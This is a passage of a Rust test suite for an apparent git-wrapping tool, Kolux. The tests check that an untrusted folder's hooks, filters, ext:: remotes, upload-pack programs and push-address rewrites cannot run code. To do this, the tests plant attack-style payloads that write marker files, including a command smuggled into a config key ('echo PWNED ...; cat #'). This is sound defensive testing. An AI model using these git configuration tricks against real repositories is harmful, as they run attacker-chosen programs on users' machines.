        assert!(!cmd.get_envs().any(|(k, v)| k == "GIT_SSH_COMMAND" && v.is_some()), "a trusted folder's ssh command is not replaced");
        let _ = run(&["fetch", "viassh"], Some(&dir));
        assert!(marker.exists(), "the trusted folder's own ssh command did not run");
        ISOLATED.with(|i| i.set(false));
        let _ = fs::remove_dir_all(&dir);
    }

    /// S4: the ref-changing forms of branch and tag are told from their reading forms.
    #[test]
    fn t779d_ref_changes_are_told_from_reads() {
        for args in [&["branch", "x"][..], &["branch", "-D", "x"], &["tag", "v1"], &["tag", "-d", "v1"], &["update-ref", "refs/heads/x", "HEAD"], &["branch", "-m", "a", "b"]] {
            assert!(ref_write(args), "{args:?}");
        }
        for args in [&["branch"][..], &["branch", "--show-current"], &["branch", "-a"], &["branch", "--list", "x*"], &["tag"], &["tag", "-l", "v*"], &["branch", "--contains", "abc"], &["status"], &["commit", "-m", "x"]] {
            assert!(!ref_write(args), "{args:?}");
        }
    }

    // ---- Review fix 4 (independent review of S4, 2026-11-09) ---------------------------------------------

    /// B1: Kolux's background tidy runs `gc --auto`; a folder's own pre-auto-gc hook must not run with it,
    /// and unstaging (`rm --cached`) must not run post-index-change. A trusted folder runs them.
    #[test]
    fn t779e_gc_and_index_commands_check_the_folders_hooks() {
        let dir = temp_repo("e-gc");
        let marker = dir.join("gc-hook-ran.txt");
        marker_hook(&dir, "pre-auto-gc", &marker);
        marker_hook(&dir, "post-index-change", &marker);
        run(&["config", "gc.auto", "1"], Some(&dir)).unwrap();
        for args in [&["gc", "--auto", "--quiet"][..], &["rm", "--cached", "-q", "README.md"], &["update-index", "--refresh"], &["mv", "README.md", "R.md"]] {
            let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
            plain_message(&why, args[0]);
            assert!(run(args, Some(&dir)).is_err());
        }
        assert!(!marker.exists(), "a refused command ran the folder's hook");
        assert!(crate::tidy::tidy_repo(&dir).is_err() && !marker.exists(), "the tidy pass stops at the gate");
        trust_for_test(&dir);
        assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_none());
        let _ = fs::remove_dir_all(&dir);
    }

    /// B2 (review fix 5): a push into a repository on this computer runs THAT repository's hooks, filters and gc
    /// under its own config, so from an untrusted folder any push is refused when any of the folder's push
    /// URLs is local: whichever remote git would pick (pushDefault), every pushurl, or a path argument. Pushes
    /// to remote URLs go ahead, and a trusted folder pushes anywhere.
    #[test]
    fn t779e_a_push_that_could_reach_a_local_repository_is_refused() {
        let dir = temp_repo("e-push");
        let marker = dir.join("receive-ran.txt");
        let payload = bare_copy(&dir, "e-push-payload");
        fs::create_dir_all(payload.join("hooks")).unwrap();
        fs::write(payload.join("hooks").join("post-receive"), format!("#!/bin/sh\necho ran >> \"{}\"\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(payload.join("hooks").join("post-receive"), fs::Permissions::from_mode(0o755)).unwrap();
        }
        // A normal-looking origin, and a pushDefault that sends a bare `git push` to the payload (review 1).
        run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir)).unwrap();
        run(&["remote", "add", "evil", &payload.to_string_lossy()], Some(&dir)).unwrap();
        run(&["config", "remote.pushDefault", "evil"], Some(&dir)).unwrap();
        for args in [&["push"][..], &["push", "origin", "main"], &["push", "-q", "--repo=origin"]] {
            let why = refused(args, &dir).unwrap_or_else(|| panic!("{args:?} was not refused"));
            plain_message(&why, "push");
            assert!(why.contains("on this computer"), "{why}");
        }
        assert!(run(&["push", "-q", "evil", "main"], Some(&dir)).is_err());
        assert!(!marker.exists(), "the receiving repository's hook ran");
        // A second pushurl on an otherwise remote origin (review 2), and a path argument.
        let dir2 = temp_repo("e-push-2");
        run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir2)).unwrap();
        run(&["config", "--add", "remote.origin.pushurl", "https://example.com/a/b.git"], Some(&dir2)).unwrap();
        run(&["config", "--add", "remote.origin.pushurl", &payload.to_string_lossy()], Some(&dir2)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir2).is_some());
        let dir3 = temp_repo("e-push-3");
        assert!(refused(&["push", ".", "HEAD:refs/heads/x"], &dir3).is_some());
        assert!(refused(&["push", "./x.git", "main"], &dir3).is_some());
        // Only remote URLs: the push is not refused here (it fails later, offline, but no gate stops it).
        run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&dir3)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir3).is_none());
        // Trusted: the user's own local remote works.
        trust_for_test(&dir);
        assert!(refused(&["push"], &dir).is_none());
        for d in [&dir, &dir2, &dir3, &payload] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 6: the six ways the fifth round still reached a local repository, each from an untrusted folder.
    #[test]
    fn t779e_push_addresses_are_resolved_by_git_itself() {
        let base = temp_repo("e-p6-src");
        let payload = bare_copy(&base, "e-p6-payload");
        let p = payload.to_string_lossy().replace('\\', "/");
        let must = |dir: &Path, args: &[&str], what: &str| {
            let why = refused(args, dir).unwrap_or_else(|| panic!("{what}: {args:?} was not refused"));
            assert!(why.contains("on this computer"), "{what}: {why}");
        };
        // 1. No origin remote; insteadOf rewrites the word "origin" to the payload.
        let d1 = temp_repo("e-p6-1");
        run(&["config", &format!("url.{p}.insteadOf"), "origin"], Some(&d1)).unwrap();
        must(&d1, &["push", "--set-upstream", "--", "origin", "main"], "insteadOf");
        // 2, 3. Legacy remote files.
        let d2 = temp_repo("e-p6-2");
        fs::create_dir_all(d2.join(".git").join("remotes")).unwrap();
        fs::write(d2.join(".git").join("remotes").join("origin"), format!("URL: {p}\n")).unwrap();
        must(&d2, &["push", "origin", "main"], ".git/remotes");
        let d3 = temp_repo("e-p6-3");
        fs::create_dir_all(d3.join(".git").join("branches")).unwrap();
        fs::write(d3.join(".git").join("branches").join("origin"), format!("{p}\n")).unwrap();
        must(&d3, &["push", "origin", "main"], ".git/branches");
        // 4. No remote at all: a bare word is a path to git.
        let d4 = temp_repo("e-p6-4");
        must(&d4, &["push", "origin", "main"], "a word that is no remote");
        // 5. A bare push whose pushDefault (or the branch's remote) is a path.
        let d5 = temp_repo("e-p6-5");
        run(&["config", "remote.pushDefault", &p], Some(&d5)).unwrap();
        must(&d5, &["push"], "pushDefault path");
        let d5b = temp_repo("e-p6-5b");
        run(&["config", "branch.main.remote", &p], Some(&d5b)).unwrap();
        must(&d5b, &["push"], "branch remote path");
        // 6. An untrusted push never recurses into submodules.
        let cmd = command_checked(&["push", "https://example.com/a.git", "main"], Some(&d4)).unwrap();
        assert!(blanked_keys(&cmd).iter().any(|k| k == "push.recurseSubmodules"));
        // A remote-only folder is still not refused.
        let ok = temp_repo("e-p6-ok");
        run(&["remote", "add", "origin", "https://example.com/a/b.git"], Some(&ok)).unwrap();
        assert!(refused(&["push", "--set-upstream", "--", "origin", "main"], &ok).is_none());
        assert!(refused(&["push"], &ok).is_none());
        for d in [&base, &payload, &d1, &d2, &d3, &d4, &d5, &d5b, &ok] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 7: a tag named like the branch, and a legacy remote file with two URL lines.
    #[test]
    fn t779e_tag_named_branches_and_legacy_url_lists() {
        let base = temp_repo("e-p7-src");
        let payload = bare_copy(&base, "e-p7-payload");
        let p = payload.to_string_lossy().replace('\\', "/");
        // A tag called main hides branch.main.pushRemote from `symbolic-ref --short`.
        let d1 = temp_repo("e-p7-1");
        run(&["tag", "main"], Some(&d1)).unwrap();
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&d1)).unwrap();
        run(&["config", "branch.main.pushRemote", &p], Some(&d1)).unwrap();
        assert!(refused(&["push"], &d1).is_some(), "the branch's pushRemote behind a tag of the same name");
        // A legacy remote file with a remote first URL and a local second one.
        let d2 = temp_repo("e-p7-2");
        fs::create_dir_all(d2.join(".git").join("remotes")).unwrap();
        fs::write(d2.join(".git").join("remotes").join("origin"), format!("URL: https://example.invalid/ok.git\nURL: {p}\n")).unwrap();
        assert!(refused(&["push", "--set-upstream", "--", "origin", "main"], &d2).is_some(), "every URL line of a legacy remote");
        // No such remote: a plain message.
        let d3 = temp_repo("e-p7-3");
        assert!(refused(&["push", "origin", "main"], &d3).unwrap().contains("no remote called origin"));
        for d in [&base, &payload, &d1, &d2, &d3] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 7's backstop, live (review fix 8, P1-4): the command Kolux builds for an untrusted push to a
    /// remote origin is run AFTER origin's address has been switched to a local payload repository (what any
    /// resolution the gate misses comes down to). git itself refuses the file transport and the payload's
    /// hook never runs. The control, the same push with every pair but the backstop's, does run the hook.
    #[test]
    fn t779e_the_file_transport_backstop_holds_when_the_address_changes_after_the_check() {
        let base = temp_repo("e-p8-src");
        let payload = bare_copy(&base, "e-p8-payload");
        let marker = base.join("p8-ran.txt");
        receive_hook(&payload, &marker);
        let dir = temp_repo("e-p8");
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
        let args = ["push", "origin", "HEAD:refs/heads/x"];
        let mut cmd = command_checked(&args, Some(&dir)).unwrap();
        assert!(plain_git(&["config", "remote.origin.url", &payload.to_string_lossy()], &dir).status.success());
        let out = cmd.output().unwrap();
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(!out.status.success(), "the push went through");
        assert!(err.contains("transport 'file' not allowed"), "git did not refuse the transport: {err}");
        assert!(!marker.exists(), "the receiving repository's hook ran");
        // The control: without the backstop pair the receiving hook runs, so this test is red without it.
        let found = repo_programs(leading_options(&args), &dir);
        let pairs: Vec<(String, String)> = overrides_for(&found, Access::Reads).into_iter().chain([("push.recurseSubmodules".to_string(), "no".to_string())]).collect();
        let out = base_command(&args, Some(&dir), &pairs, &[]).output().unwrap();
        assert!(!out.status.success(), "the pre-receive hook exits 1");
        assert!(marker.exists(), "the control: without the backstop the receiving repository's hook runs: {}", String::from_utf8_lossy(&out.stderr));
        for d in [&base, &payload, &dir] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 8 (P1-1): a `pushInsteadOf` rule to a local base is applied by the push alone (`ls-remote
    /// --get-url` does not apply it), so the rule itself refuses, for a remote and for a URL argument alike;
    /// an `insteadOf` rule the same way; a rule to a remote base is fine.
    #[test]
    fn t779e_a_rewrite_rule_to_a_local_address_refuses_the_push() {
        let base = temp_repo("e-p8-rw-src");
        let payload = bare_copy(&base, "e-p8-rw-payload");
        let p = payload.to_string_lossy().replace('\\', "/");
        let dir = temp_repo("e-p8-rw");
        run(&["config", &format!("url.{p}.pushInsteadOf"), "https://example.invalid/"], Some(&dir)).unwrap();
        // The premise: git's address lookup leaves the rule out; the push would apply it.
        let shown = plain_git(&["ls-remote", "--get-url", "https://example.invalid/other.git"], &dir);
        assert_eq!(String::from_utf8_lossy(&shown.stdout).trim(), "https://example.invalid/other.git");
        // No remote at all: the URL argument is the one route, and only the rule itself tells where it leads.
        let why = refused(&["push", "https://example.invalid/other.git", "main"], &dir).expect("pushInsteadOf to a local base, URL argument");
        assert!(why.contains("rewrites push addresses") && why.contains("pushinsteadof"), "{why}");
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir).is_some(), "pushInsteadOf to a local base, remote");
        run(&["config", "--unset", &format!("url.{p}.pushInsteadOf")], Some(&dir)).unwrap();
        run(&["config", "url.https://example.invalid/mirror/.pushInsteadOf", "https://example.invalid/"], Some(&dir)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir).is_none(), "a rule to a remote base");
        run(&["config", &format!("url.{p}.insteadOf"), "https://example.invalid/"], Some(&dir)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir).unwrap().contains("insteadof"), "insteadOf to a local base");
        // P3: the same rule in the USER's global config still refuses (it lands on this computer all the same),
        // but the message does not blame the folder.
        run(&["config", "--unset", &format!("url.{p}.insteadOf")], Some(&dir)).unwrap();
        assert!(refused(&["push", "origin", "main"], &dir).is_none(), "no rule left in the folder");
        let global = dir.join("user-gitconfig");
        fs::write(&global, format!("[url \"{p}\"]\n\tpushInsteadOf = https://example.invalid/\n")).unwrap();
        ISOLATED.with(|i| i.set(true));
        GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = Some(global.clone()));
        let why = refused(&["push", "origin", "main"], &dir).expect("a global rule to a local base");
        GLOBAL_FOR_TEST.with(|g| *g.borrow_mut() = None);
        ISOLATED.with(|i| i.set(false));
        assert!(why.contains("your own git settings (global config) rewrite push addresses") && !why.contains("the folder rewrites"), "{why}");
        for d in [&base, &payload, &dir] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 8 follow-up (P1): a forced key is handed to GIT_CONFIG_PARAMETERS in git's split form, one
    /// quoted word for the key and one for the value, so a `=` inside the key (a filter whose subsection is
    /// `a.clean=<program> #`) stays part of the key instead of starting the value. In the one-word form git
    /// split it at the first `=`, which set `filter.a.clean` to the program, and `status` ran it (plain git
    /// with that word: the premise). The wiring is live: an "inherited" empty GIT_CONFIG_PARAMETERS is enough
    /// to make Kolux append its pairs.
    #[test]
    fn t779_a_forced_key_with_an_equals_sign_stays_one_key() {
        use std::ffi::OsStr;
        let dir = temp_repo("p8-eq");
        let marker = dir.join("..").join(format!("kolux-rs-p8-eq-pwn-{}.txt", std::process::id()));
        let _ = fs::remove_file(&marker);
        let program = format!("echo PWNED >> \"{}\"; cat #", marker.to_string_lossy().replace('\\', "/"));
        let odd_key = format!("filter.a.clean={program}.clean");
        fs::write(dir.join(".gitattributes"), "* filter=a\n").unwrap();
        plain_git(&["add", ".gitattributes"], &dir);
        plain_git(&["-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", "commit", "-qm", "attrs"], &dir);
        plain_git(&["config", &odd_key, "x"], &dir);
        // A tracked file whose content changed: status re-hashes it, through the clean filter.
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        // The word as Kolux wrote it before, and as it writes it now.
        let old_word = format!("'{odd_key}='");
        let parameters = config_parameters(Some(OsStr::new("")), &[(odd_key.clone(), String::new())]).unwrap();
        let new_word = format!("'{odd_key}'=''");
        assert!(parameters.ends_with(&format!(" {new_word}")), "{parameters}");
        let with = |word: &str, args: &[&str]| {
            let mut c = Command::new("git");
            c.args(args).current_dir(&dir).env("GIT_CONFIG_PARAMETERS", word).env_remove("GIT_CONFIG_COUNT");
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                c.creation_flags(0x0800_0000);
            }
            let out = c.output().unwrap();
            (out.status.code(), String::from_utf8_lossy(&out.stdout).trim_end().to_string())
        };
        // The premise: the one-word form made git run the program on a status.
        with(&old_word, &["status", "--short"]);
        assert!(marker.exists(), "the premise: plain git splits '{odd_key}=' at the first = and runs the program");
        fs::remove_file(&marker).unwrap();
        // The split form: the full key, as one key, and nothing under `filter.a.clean`.
        let (_, listed) = with(&new_word, &["config", "--show-scope", "--get-regexp", "^filter\\.a"]);
        assert!(listed.lines().any(|l| l == format!("command\t{odd_key}")), "{listed}");
        assert_eq!(with(&new_word, &["config", "--get", "filter.a.clean"]).0, Some(1), "nothing was set under filter.a.clean");
        with(&new_word, &["status", "--short"]);
        assert!(!marker.exists(), "the split form still ran the program");
        // A quote in the key round-trips too.
        let quoted_key = "filter.it's.clean".to_string();
        let word = config_parameters(Some(OsStr::new("")), &[(quoted_key.clone(), String::new())]).unwrap();
        let (_, listed) = with(&word, &["config", "--show-scope", "--get-regexp", "^filter\\.it"]);
        assert!(listed.lines().any(|l| l == format!("command\t{quoted_key}")), "{listed}");
        // Live through Kolux: the folder's odd key is found and blanked, the parent's (empty) list is extended
        // in the split form, and the status runs nothing.
        ISOLATED.with(|i| i.set(true));
        PARENT_ENV_FOR_TEST.with(|p| *p.borrow_mut() = vec![("GIT_CONFIG_PARAMETERS".to_string(), String::new())]);
        let cmd = command(&["status", "--short"], Some(&dir));
        let parameters = cmd.get_envs().find(|(k, _)| *k == "GIT_CONFIG_PARAMETERS").and_then(|(_, v)| v).map(|v| v.to_string_lossy().into_owned()).unwrap_or_default();
        assert!(parameters.contains(&new_word), "{parameters}");
        let status = run(&["status", "--short"], Some(&dir));
        PARENT_ENV_FOR_TEST.with(|p| p.borrow_mut().clear());
        ISOLATED.with(|i| i.set(false));
        assert!(status.is_ok(), "{status:?}");
        assert!(!marker.exists(), "Kolux's git ran the folder's program through GIT_CONFIG_PARAMETERS");
        let _ = fs::remove_file(&marker);
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 8 (P1-2): a push target that begins with `-` (a `remote.pushDefault` of `--heads`, or the word
    /// after `--`) is never handed to a listing git where it would be read as an option; it is refused, since git
    /// itself would take the word for a folder.
    #[test]
    fn t779e_a_push_target_that_looks_like_an_option_is_refused() {
        let dir = temp_repo("e-p8-opt");
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
        assert!(refused(&["push", "--", "--heads", "main"], &dir).is_some_and(|w| w.contains("--heads")), "the word after --");
        run(&["config", "remote.pushDefault", "--heads"], Some(&dir)).unwrap();
        let why = refused(&["push"], &dir).expect("an option-like push default");
        assert!(why.contains("--heads") && why.contains("option"), "{why}");
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 8 (P1-3): `origin ` (trailing space) is a remote of its own to git. The gate reads the branch's
    /// push remote as written, so it finds that remote's local address where a trimmed name found origin's.
    #[test]
    fn t779e_a_remote_name_keeps_its_spaces() {
        let base = temp_repo("e-p8-sp-src");
        let payload = bare_copy(&base, "e-p8-sp-payload");
        let marker = base.join("sp-ran.txt");
        receive_hook(&payload, &marker);
        let dir = temp_repo("e-p8-sp");
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
        run(&["config", "remote.origin .url", &payload.to_string_lossy()], Some(&dir)).unwrap();
        run(&["checkout", "-q", "-b", "x"], Some(&dir)).unwrap();
        run(&["config", "branch.x.pushRemote", "origin "], Some(&dir)).unwrap();
        run(&["config", "push.default", "current"], Some(&dir)).unwrap();
        // The premise: plain git pushes to the payload through the remote with the space.
        assert!(!plain_git(&["push", "-q"], &dir).status.success());
        assert!(marker.exists(), "the premise: git pushes to the remote `origin `");
        fs::remove_file(&marker).unwrap();
        let why = refused(&["push"], &dir).expect("the push remote `origin ` has a local address");
        assert!(why.contains("on this computer"), "{why}");
        for d in [&base, &payload, &dir] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 8 (P2-2): a listing the push gate cannot read (a HEAD git cannot follow, where `symbolic-ref`
    /// fails rather than says "unset") refuses instead of counting as unset; a detached HEAD, which is "unset",
    /// does not.
    #[test]
    fn t779e_a_push_listing_that_fails_refuses() {
        let dir = temp_repo("e-p8-fail");
        run(&["remote", "add", "origin", "https://example.invalid/a.git"], Some(&dir)).unwrap();
        assert!(refused(&["push"], &dir).is_none());
        assert!(plain_git(&["checkout", "-q", "--detach"], &dir).status.success());
        assert!(refused(&["push"], &dir).is_none(), "a detached HEAD is no branch, and that is all");
        fs::write(dir.join(".git").join("HEAD"), "ref: refs/heads/bad..name\n").unwrap();
        let why = refused(&["push"], &dir).expect("a HEAD git cannot read");
        assert!(why.contains("symbolic-ref") && why.contains("failed"), "{why}");
        fs::write(dir.join(".git").join("HEAD"), "ref: refs/heads/main\n").unwrap();
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 8 (P2-1): a parent's GIT_CONFIG_PARAMETERS is read after the GIT_CONFIG_COUNT slots, and a
    /// parent's GIT_ALLOW_PROTOCOL makes git ignore every protocol.*.allow. Kolux's pairs are appended to the
    /// first and the transports it switches off are taken out of the second, so neither turns the backstop off.
    #[test]
    fn t779_a_parents_own_git_environment_never_outranks_kolux() {
        use std::ffi::OsStr;
        let never = vec![("protocol.file.allow".to_string(), "never".to_string())];
        let read = |env: &[(&str, &str)]| {
            let mut c = Command::new("git");
            c.args(["config", "protocol.file.allow"]).env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
            for (k, v) in env {
                c.env(k, v);
            }
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                c.creation_flags(0x0800_0000);
            }
            String::from_utf8_lossy(&c.output().unwrap().stdout).trim().to_string()
        };
        // The premise: the slots alone lose to the parent's list.
        assert_eq!(read(&[("GIT_CONFIG_PARAMETERS", "'protocol.file.allow=always'"), ("GIT_CONFIG_COUNT", "1"), ("GIT_CONFIG_KEY_0", "protocol.file.allow"), ("GIT_CONFIG_VALUE_0", "never")]), "always");
        assert_eq!(config_parameters(None, &never), None, "nothing to append to");
        let appended = config_parameters(Some(OsStr::new("'protocol.file.allow=always'")), &never).unwrap();
        assert!(appended.starts_with("'protocol.file.allow=always' 'core.fsmonitor'='false' ") && appended.ends_with(" 'protocol.file.allow'='never'"), "{appended}");
        assert_eq!(read(&[("GIT_CONFIG_PARAMETERS", &appended)]), "never");
        let quoted = config_parameters(Some(OsStr::new("")), &[("a.b".to_string(), "it's".to_string())]).unwrap();
        assert!(quoted.ends_with("'a.b'='it'\\''s'"), "{quoted}");
        assert_eq!(allow_protocol(None, &never), None);
        assert_eq!(allow_protocol(Some(OsStr::new("file:https:ext")), &never).unwrap(), "https");
        assert_eq!(allow_protocol(Some(OsStr::new("file:https")), &[]).unwrap(), "file:https", "a trusted run keeps the parent's list but for ext");
        assert_eq!(allow_protocol(Some(OsStr::new("file:https")), &[("protocol.allow".to_string(), "never".to_string())]).unwrap(), "");
        // Live: git itself refuses the file transport under the filtered list, and allows it under the parent's.
        let src = temp_repo("p8-env-src");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-p8-env-dest-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dest);
        let clone = |allow: &str| {
            let mut c = Command::new("git");
            c.args(["clone", "-q", &src.to_string_lossy(), &dest.to_string_lossy()]).env("GIT_ALLOW_PROTOCOL", allow);
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                c.creation_flags(0x0800_0000);
            }
            let out = c.output().unwrap();
            (out.status.success(), String::from_utf8_lossy(&out.stderr).to_string())
        };
        let (ok, err) = clone(&allow_protocol(Some(OsStr::new("file:https")), &never).unwrap());
        assert!(!ok && err.contains("transport 'file' not allowed"), "{err}");
        assert!(clone("file:https").0, "the parent's own list allows it");
        let _ = fs::remove_dir_all(&dest);
        let _ = fs::remove_dir_all(&src);
    }

    /// Review fix 6: a relative core.hooksPath is resolved against the worktree's top level, as git does, so a
    /// gc run from a subfolder still sees the hook.
    #[test]
    fn t779e_a_relative_hooks_path_is_read_from_the_top_level() {
        let dir = temp_repo("e-hp-sub");
        fs::create_dir_all(dir.join(".husky")).unwrap();
        fs::create_dir_all(dir.join("sub")).unwrap();
        run(&["config", "core.hooksPath", ".husky"], Some(&dir)).unwrap();
        fs::write(dir.join(".husky").join("pre-auto-gc"), "#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(dir.join(".husky").join("pre-auto-gc"), fs::Permissions::from_mode(0o755)).unwrap();
        }
        assert!(refused(&["gc", "--auto", "--quiet"], &dir.join("sub")).is_some());
        let _ = fs::remove_dir_all(&dir);
    }

    /// Review fix 5 (B4): promisor is a git boolean, and before git 2.45 (which ignores GIT_NO_LAZY_FETCH) every
    /// transport is switched off on an untrusted partial clone's read, so its lazy fetch runs nothing.
    #[test]
    fn t779e_a_partial_clone_read_runs_no_program_on_any_git() {
        let base = temp_repo("e-promisor-src");
        let marker = base.join("lazy-ran.txt");
        let bare = bare_copy(&base, "e-promisor");
        for value in ["1", "yes", "on"] {
            let dir = temp_repo(&format!("e-promisor-{value}"));
            run(&["config", "remote.origin.url", &bare.to_string_lossy()], Some(&dir)).unwrap();
            run(&["config", "remote.origin.promisor", value], Some(&dir)).unwrap();
            let cmd = command(&["show", "HEAD"], Some(&dir));
            assert!(blanked_keys(&cmd).iter().any(|k| k == "protocol.file.allow"), "promisor={value} was not seen");
            let _ = fs::remove_dir_all(&dir);
        }
        // Live: a real partial clone whose blob is missing, with the folder's own upload-pack program.
        let blobless = std::env::temp_dir().join(format!("kolux-rs-git-e-blobless-{}", std::process::id()));
        let _ = fs::remove_dir_all(&blobless);
        assert!(plain_git(&["config", "--file", &bare.join("config").to_string_lossy(), "uploadpack.allowFilter", "true"], &base).status.success());
        assert!(plain_git(&["clone", "-q", "--no-checkout", "--filter=blob:none", &format!("file://{}", bare.to_string_lossy().replace('\\', "/")), &blobless.to_string_lossy()], &base).status.success());
        run(&["config", "remote.origin.uploadpack", &exit_script(&marker)], Some(&blobless)).unwrap();
        let _ = plain_git(&["show", "HEAD:README.md"], &blobless);
        assert!(marker.exists(), "the premise: plain git's read lazy-fetches through the folder's upload-pack");
        fs::remove_file(&marker).unwrap();
        let _ = run(&["show", "HEAD:README.md"], Some(&blobless));
        assert!(!marker.exists(), "Kolux's read ran the folder's upload-pack");
        for d in [&base, &bare, &blobless] {
            let _ = fs::remove_dir_all(d);
        }
    }

    /// Review fix 5: a folder with its own hooks folder (husky and the like) still gets its background gc when
    /// that folder has no pre-auto-gc hook; one that has it is refused. A hook named in config is refused.
    #[test]
    fn t779e_gc_looks_inside_the_folders_own_hooks_folder() {
        let dir = temp_repo("e-hookspath-gc");
        fs::create_dir_all(dir.join(".husky")).unwrap();
        run(&["config", "core.hooksPath", ".husky"], Some(&dir)).unwrap();
        assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_none(), "a hooks folder without pre-auto-gc");
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).is_some(), "a write is still refused outright");
        fs::write(dir.join(".husky").join("pre-auto-gc"), "#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(dir.join(".husky").join("pre-auto-gc"), fs::Permissions::from_mode(0o755)).unwrap();
        }
        assert!(refused(&["gc", "--auto", "--quiet"], &dir).is_some());
        run(&["config", "--unset", "core.hooksPath"], Some(&dir)).unwrap();
        run(&["config", "hook.lint.command", "sh evil.sh"], Some(&dir)).unwrap();
        assert!(refused(&["commit", "-q", "-m", "x"], &dir).unwrap().contains("hook.lint.command"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn t779e_local_urls_are_told_from_remote_ones() {
        // `ä:/x` and `Ω:x`: git takes a single letter before the colon as a drive, whatever the alphabet (P3).
        for u in ["/srv/x.git", "./evil.git", ".", "..", "file:///x", "C:/repos/x", r"C:\repos\x", "relative/path", "ä:/x", "Ω:x", "d:"] {
            assert!(is_local_url(u), "{u}");
        }
        for u in ["https://github.com/a/b", "ssh://h/x", "git@github.com:a/b.git", "host:path", "ab:/x", "äb:/x"] {
            assert!(!is_local_url(u), "{u}");
        }
    }

    /// B3: `ext::` remotes run a command line of the URL's choosing; the folder's own `protocol.ext.allow`
    /// cannot switch them on under Kolux's git (plain git runs it: the premise).
    #[test]
    fn t779e_ext_remotes_never_run_a_command() {
        let dir = temp_repo("e-ext");
        let marker = dir.join("ext-ran.txt");
        let script = exit_script(&marker);
        run(&["config", "protocol.ext.allow", "always"], Some(&dir)).unwrap();
        run(&["remote", "add", "evil", &format!("ext::{script} %S")], Some(&dir)).unwrap();
        let _ = plain_git(&["ls-remote", "evil"], &dir);
        assert!(marker.exists(), "the premise: plain git runs an ext:: remote's command");
        fs::remove_file(&marker).unwrap();
        let _ = run(&["ls-remote", "evil"], Some(&dir));
        let _ = run(&["fetch", "evil"], Some(&dir));
        assert!(!marker.exists(), "Kolux's git ran an ext:: command");
        let _ = fs::remove_dir_all(&dir);
    }

    /// B3, B4: a read in an untrusted partial clone fetches nothing on its own and runs no credential helper.
    #[test]
    fn t779e_reads_in_an_untrusted_partial_clone_never_lazy_fetch() {
        let dir = temp_repo("e-partial");
        run(&["config", "extensions.partialClone", "origin"], Some(&dir)).unwrap();
        run(&["config", "remote.origin.promisor", "true"], Some(&dir)).unwrap();
        let cmd = command(&["show", "HEAD"], Some(&dir));
        assert!(cmd.get_envs().any(|(k, v)| k == "GIT_NO_LAZY_FETCH" && v.is_some_and(|v| v == "1")));
        assert!(blanked_keys(&cmd).iter().any(|k| k == "credential.helper"));
        trust_for_test(&dir);
        let cmd = command(&["show", "HEAD"], Some(&dir));
        assert!(!cmd.get_envs().any(|(k, v)| k == "GIT_NO_LAZY_FETCH" && v.is_some()), "a trusted partial clone fetches as usual");
        let _ = fs::remove_dir_all(&dir);
    }

    /// B5: a folder's own `core.alternateRefsCommand` never runs, trusted or not (plain git runs it on fetch).
    #[test]
    fn t779e_the_alternate_refs_command_never_runs() {
        let dir = temp_repo("e-altrefs");
        let marker = dir.join("altrefs-ran.txt");
        let other = temp_repo("e-altrefs-other");
        fs::write(dir.join(".git").join("objects").join("info").join("alternates"), format!("{}\n", other.join(".git").join("objects").to_string_lossy())).unwrap_or_else(|_| {
            fs::create_dir_all(dir.join(".git").join("objects").join("info")).unwrap();
            fs::write(dir.join(".git").join("objects").join("info").join("alternates"), format!("{}\n", other.join(".git").join("objects").to_string_lossy())).unwrap();
        });
        run(&["config", "core.alternateRefsCommand", &exit_script(&marker)], Some(&dir)).unwrap();
        let bare = bare_copy(&other, "e-altrefs");
        run(&["remote", "add", "o", &bare.to_string_lossy()], Some(&dir)).unwrap();
        let _ = plain_git(&["fetch", "o"], &dir);
        assert!(marker.exists(), "the premise: plain git runs core.alternateRefsCommand on fetch");
        fs::remove_file(&marker).unwrap();
        let _ = run(&["fetch", "o"], Some(&dir));
        assert!(!marker.exists(), "Kolux's git ran the folder's core.alternateRefsCommand");
        trust_for_test(&dir);
        let _ = run(&["fetch", "o"], Some(&dir));
